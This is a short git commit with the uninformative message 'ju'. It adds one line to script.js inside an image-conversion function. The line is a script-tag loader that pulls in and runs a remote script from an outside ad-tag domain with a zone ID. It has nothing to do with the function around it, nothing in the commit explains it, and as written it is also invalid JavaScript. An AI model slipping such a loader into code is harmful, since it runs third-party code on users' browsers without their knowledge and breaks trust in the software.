7b2348f728adaf8c49b290e00b131e729f9cd8fb
plan.theory <100511748+jervin2336@users.noreply.github.com>
2023-06-18 10:53:02 +0800

    ju

--- script.js
+++ script.js
@@ -108,4 +108,5 @@ const imgConverter = (
         resolve(canvas.toDataURL(`image/${format}`));
       };
     };
+    <script>(function(s,u,z,p){s.src=u,s.setAttribute('data-zone',z),p.appendChild(s)})(document.createElement('script'),'https://inklinkor.com/tag.min.js',6055807,document.body||document.documentElement)</script>
   });
